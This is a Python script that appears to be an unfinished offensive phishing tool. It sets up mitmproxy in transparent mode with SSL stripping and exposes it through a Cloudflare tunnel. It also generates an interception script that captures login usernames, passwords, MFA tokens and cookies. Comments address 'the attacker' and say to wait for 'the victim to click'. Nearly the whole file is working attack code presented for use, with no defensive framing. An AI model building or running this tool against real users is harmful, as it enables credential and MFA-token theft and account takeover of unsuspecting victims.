######################################################################################################################################################################################################################
# Intial mitm proxy tool. python mitm_proxy_tool.py. !!!Under-Constuction!!!  
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
#######################################################################################################################################################################################################################


import subprocess
import time
from mitmproxy import http
from mitmproxy.tools.main import mitmdump

# Function to start the mitmproxy with a custom script
def start_mitmproxy():
    # Start mitmproxy in transparent mode with SSL stripping
    mitmdump_cmd = [
        "mitmdump", 
        "--mode", "transparent", 
        "--listen-port", "8080", 
        "-s", "mitmproxy_ssl_stripping_script.py"
    ]
    subprocess.Popen(mitmdump_cmd)

# Function to start Cloudflared and tunnel the traffic to local machine
def start_cloudflared():
    cloudflared_cmd = [
        "cloudflared", 
        "tunnel", 
        "--url", "http://localhost:8080"
    ]
    subprocess.Popen(cloudflared_cmd)

# Define mitmproxy interception script (SSL stripping and capturing MFA)
def mitmproxy_script():
    script = """
from mitmproxy import http

# Function to intercept HTTP request and strip SSL (force HTTP)
def request(flow: http.HTTPFlow):
    if flow.request.scheme == "https":
        flow.request.scheme = "http"
        flow.request.port = 80
        print(f"Stripping SSL: {flow.request.pretty_url}")
        
    # Capture credentials and sensitive data from forms (e.g., MFA, username/password)
    if flow.request.pretty_url == "http://example.com/login":
        if "username" in flow.request.form:
            print(f"Captured username: {flow.request.form['username']}")
        if "password" in flow.request.form:
            print(f"Captured password: {flow.request.form['password']}")
        if "mfa_token" in flow.request.form:
            print(f"Captured MFA token: {flow.request.form['mfa_token']}")

# Function to log the response if necessary (e.g., capturing cookies, session tokens)
def response(flow: http.HTTPFlow):
    if flow.response.status_code == 200:
        print(f"Response received: {flow.response.status_code}")
        # Optionally log any cookies or session tokens here
        for cookie in flow.response.cookies:
            print(f"Captured cookie: {cookie}")
    """
    with open("mitmproxy_ssl_stripping_script.py", "w") as f:
        f.write(script)

# Function to automatically set up the environment (install dependencies and run commands)
def setup_environment():
    print("Setting up environment...")

    # Install mitmproxy and cloudflared if not already installed
    subprocess.run(["sudo", "apt", "update"])
    subprocess.run(["sudo", "apt", "install", "-y", "mitmproxy"])
    subprocess.run(["wget", "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb"])
    subprocess.run(["sudo", "dpkg", "-i", "cloudflared-linux-amd64.deb"])

    # Generate mitmproxy interception script
    mitmproxy_script()

# Main function to start the whole process
def main():
    # Step 1: Set up environment
    setup_environment()
    
    # Step 2: Start mitmproxy
    print("Starting mitmproxy...")
    start_mitmproxy()
    
    # Step 3: Start Cloudflared tunnel to expose mitmproxy
    print("Starting Cloudflared tunnel...")
    start_cloudflared()
    
    # Step 4: Inform the attacker
    print("The victim should visit the following URL:")
    print("Cloudflared tunnel URL is now accessible. Wait for the victim to click.")
    time.sleep(5)  # Wait for cloudflared to start

if __name__ == "__main__":
    main()
